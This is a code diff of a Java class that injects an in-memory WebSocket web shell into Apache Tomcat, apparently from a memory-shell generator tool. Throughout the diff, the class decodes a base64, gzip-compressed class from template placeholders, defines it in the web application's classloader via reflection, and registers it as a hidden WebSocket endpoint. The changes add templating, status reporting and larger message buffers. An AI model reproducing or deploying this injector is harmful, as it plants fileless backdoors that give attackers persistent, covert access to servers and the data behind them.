@@ -3,6 +3,7 @@ package org.leo.jmg.mem.injectortpl.tomcat;
 import java.io.ByteArrayInputStream;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
+import java.io.PrintStream;
 import java.lang.reflect.Constructor;
 import java.lang.reflect.Field;
 import java.lang.reflect.Method;
@@ -12,39 +13,51 @@ import java.util.Set;
 import java.util.zip.GZIPInputStream;
 
 /**
- * @author ReaJason
  * @since 2024/12/9
  */
 public class TomcatWebSocketInjector {
 
-    private static String urlPattern;
-    private static String shellClassName;
-    private static String shellClass;
-    private static boolean ok;
+    private static String msg = "";
+    private static boolean ok = false;
+
+    public String getUrlPattern() {
+        return "{{urlPattern}}";
+    }
+
+    public String getClassName() {
+        return "{{className}}";
+    }
+
+    public String getBase64String() {
+        return "{{base64Str}}";
+    }
 
     public TomcatWebSocketInjector() {
         if (ok) {
             return;
         }
-        Set<Object> contexts;
+        Set<Object> contexts = null;
         try {
             contexts = getContext();
         } catch (Throwable throwable) {
-            contexts = null;
+            msg += "context error: " + getErrorMessage(throwable);
         }
-        if (contexts != null && !contexts.isEmpty()) {
+        if (contexts == null || contexts.isEmpty()) {
+            msg += "context not found";
+        } else {
             for (Object context : contexts) {
                 try {
+                    msg += ("context: [" + getContextRoot(context) + "] ");
                     Object shell = getShell(context);
                     inject(context, shell);
-                } catch (Throwable ignored) {
+                    msg += "[" + getUrlPattern() + "] ready\n";
+                } catch (Throwable e) {
+                    msg += "failed " + getErrorMessage(e) + "\n";
                 }
             }
         }
         ok = true;
-        shellClass = null;
-        shellClassName = null;
-        urlPattern = null;
+        System.out.println(msg);
     }
 
     public Set<Object> getContext() throws Exception {
@@ -84,6 +97,23 @@ public class TomcatWebSocketInjector {
         return contexts;
     }
 
+    @SuppressWarnings("all")
+    private String getContextRoot(Object context) {
+        String r = null;
+        try {
+            r = (String) invokeMethod(invokeMethod(context, "getServletContext", null, null), "getContextPath", null, null);
+        } catch (Exception ignored) {
+        }
+        String c = context.getClass().getName();
+        if (r == null) {
+            return c;
+        }
+        if (r.isEmpty()) {
+            return c + "(/)";
+        }
+        return c + "(" + r + ")";
+    }
+
     private ClassLoader getWebAppClassLoader(Object context) {
         try {
             return ((ClassLoader) invokeMethod(context, "getClassLoader", null, null));
@@ -96,19 +126,21 @@ public class TomcatWebSocketInjector {
     @SuppressWarnings("all")
     private Object getShell(Object context) throws Exception {
         ClassLoader classLoader = getWebAppClassLoader(context);
-        Class<?> clazz;
+        Class<?> clazz = null;
         try {
-            clazz = classLoader.loadClass(shellClassName);
+            clazz = classLoader.loadClass(getClassName());
         } catch (Exception e) {
-            byte[] clazzByte = gzipDecompress(decodeBase64(shellClass));
+            byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
             Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
             defineClass.setAccessible(true);
             clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
         }
+        msg += "[" + classLoader.getClass().getName() + "] ";
         return clazz.newInstance();
     }
 
 
+    @SuppressWarnings("unchecked")
     private void inject(Object context, Object obj) throws Exception {
         Object servletContext = invokeMethod(context, "getServletContext", null, null);
         Object container = invokeMethod(servletContext, "getAttribute", new Class[]{String.class}, new Object[]{"javax.websocket.server.ServerContainer"});
@@ -120,11 +152,11 @@ public class TomcatWebSocketInjector {
             throw new RuntimeException("container is null");
         }
 
-        if (invokeMethod(container, "findMapping", new Class[]{String.class}, new Object[]{urlPattern}) != null) {
+        if (invokeMethod(container, "findMapping", new Class[]{String.class}, new Object[]{getUrlPattern()}) != null) {
             return;
         }
 
-        ClassLoader contextClassLoader = getWebAppClassLoader(context);
+        ClassLoader contextClassLoader = context.getClass().getClassLoader();
         Class<?> serverEndpointConfigClass;
         Class<?> builderClass;
         try {
@@ -136,10 +168,17 @@ public class TomcatWebSocketInjector {
         }
         Constructor<?> constructor = builderClass.getDeclaredConstructor(Class.class, String.class);
         constructor.setAccessible(true);
-        Object o1 = constructor.newInstance(obj.getClass(), urlPattern);
+        Object o1 = constructor.newInstance(obj.getClass(), getUrlPattern());
         Object endpointConfig = invokeMethod(o1, "build", null, null);
 
+        invokeMethod(container, "setDefaultMaxTextMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
+        invokeMethod(container, "setDefaultMaxBinaryMessageBufferSize", new Class[]{int.class}, new Object[]{52428800});
         invokeMethod(container, "addEndpoint", new Class[]{serverEndpointConfigClass}, new Object[]{endpointConfig});
+    }
+
+    @Override
+    public String toString() {
+        return msg;
     }
 
     @SuppressWarnings("all")
@@ -216,6 +255,21 @@ public class TomcatWebSocketInjector {
             }
         }
         throw new NoSuchFieldException(obj.getClass().getName() + " Field not found: " + name);
+    }
+
+    @SuppressWarnings("all")
+    private String getErrorMessage(Throwable throwable) {
+        PrintStream printStream = null;
+        try {
+            ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+            printStream = new PrintStream(outputStream);
+            throwable.printStackTrace(printStream);
+            return outputStream.toString();
+        } finally {
+            if (printStream != null) {
+                printStream.close();
+            }
+        }
     }
 
 }
